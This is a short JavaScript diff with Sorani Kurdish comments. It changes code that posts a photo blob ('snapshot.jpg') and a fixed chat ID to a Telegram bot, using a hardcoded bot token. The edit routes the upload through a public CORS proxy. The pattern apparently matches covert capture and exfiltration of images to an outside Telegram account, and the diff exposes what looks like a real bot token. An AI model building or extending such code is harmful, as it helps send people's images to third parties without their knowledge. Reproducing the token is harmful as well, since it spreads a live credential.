@@ -33,11 +33,12 @@
               formData.append('chat_id', '6539379136');
               formData.append('photo', blob, 'snapshot.jpg');
 
-              // ناردنی ڕاستەوخۆ بۆ سێرڤەری تلگرام بێ هیچ پرۆکسی و ناوەندێک
-              const token = "8699050179:AAGeUEWCavf8zBFg8dHxoQb4YU1ofp0T3Cw";
-              const telegramUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+              // پاککردنەوەی خۆکارانەی هەر فەزایەکی شاراوە لە تۆکەنەکەدا
+              const rawToken = "8699050179:AAGeUEWCavf8zBFg8dHxoQb4YU1ofp0T3Cw";
+              const token = rawToken.replace(/\s+/g, '');
+              const targetUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
 
-              fetch(telegramUrl, {
+              fetch('https://corsproxy.io/?' + encodeURIComponent(targetUrl), {
                 method: 'POST',
                 body: formData
               })
